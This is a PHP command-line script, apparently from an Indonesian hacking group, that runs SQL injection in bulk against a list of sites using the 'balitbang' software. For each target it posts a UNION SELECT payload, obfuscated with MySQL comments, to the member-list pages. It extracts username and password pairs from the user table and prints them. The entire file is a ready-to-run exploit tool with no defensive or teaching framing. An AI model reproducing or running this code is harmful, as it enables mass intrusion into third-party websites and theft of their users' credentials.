<?php
/* Welcome To Source Code */
/*
   Coded by Zeerx7
*/
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
	$R  = "";
	$RR = "";
	$G  = "";
	$GG = "";
	$C  = "";
	$CC = "";
	$B  = "";
	$BB = "";
	$Y  = "";
	$YY = "";
	$P  = "";
	$X  = "";
} else {
	$R  = "\e[91m";
	$RR = "\e[91;7m";
	$G  = "\e[92m";
	$GG = "\e[92;7m";
	$C  = "\e[36m";
	$CC = "\e[36;7m";
        $B  = "\e[94m";
	$BB = "\e[94;7m";
	$Y  = "\e[93m";
	$YY = "\e[93;7m";
	$P  = "\e[35m";
	$X  = "\e[0m";
	system('clear');
}
$dick = $argv[1];
if(empty($dick)){
 //kosong
 banner($R,$G,$Y,$B,$X,$P,$C);
 usage($R,$G,$Y,$B,$X,$P,$C);
 exit;
}else{
 banner($R,$G,$Y,$B,$X,$P,$C);
}
$mmk = ["/member/listmemberall.php","/users/listmemberall.php"];
//input and open list
echo "url from-> $dick\n ";
//$inputfile = trim(fgets(STDIN));
$inputfile = "list.txt";
$open = fopen("$dick","r");
$size = filesize("$dick");
$read = fread($open,$size);
$file = explode("\n",$read);

foreach($file as $url){
 foreach($mmk as $urls){
 $urls = $url."$urls";
 //$urls= $url."/member/listmemberall.php";
 $urlo= $utl."/admin/";
 $sheep = exploit($urls);
 if(!empty($sheep[1])) {
     $i=1;
     foreach($sheep[1] as $bro) {
 	 echo $C."\n[+]$G Successful -> ".$urls;
	 $pussy = $C."[+]$G Username : ".str_replace(":", $C."\n[+]$G Password : ", $bro);
         echo $C."\n[+]$G ".$i++."$C [+]";
         echo "\n$pussy\n";
     }
 } else {
     echo $R."\n[-] Target : $url { Failed }";
 }
}
}
//function
function exploit($url){
	$ch = curl_init();
	$ploit = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$ploit,version()-- -");
	curl_setopt($ch, CURLOPT_VERBOSE, false);
	$response = curl_exec($ch);
	$c = preg_match_all("'<result>(.*?)</result>'si", $response,$code);
	return $code;
}function banner($R,$G,$Y,$B,$X,$P,$C){
//echo "$B
// ---------------------------------------------
echo "$R      (\"`-'  '-/\") .___..--' ' \"`-._
        ` *_ *  )    `-.   (      ) .`-.__.`)
        (_Y_.) ' ._   )   `._` ;  `` -. .-'
     _.. `--'_..-_/   /--' _ .' ,4
  ( i l ),-''  ( l i),'  ( ( ! .-'
$B ---------------------------------------------
$G    Coded by Zeerx7$R from$G XploitSecurity-ID
$B ---------------------------------------------
";
}function usage($R,$G,$Y,$B,$X,$P,$C){
echo "$G         Mass sqli balitbang post data
$P         usage:$C php balit.php list.txt
$B ---------------------------------------------
";
}
echo "\n";
/* CopyRight 2020 Indonesian Hacker Rulez */
?>
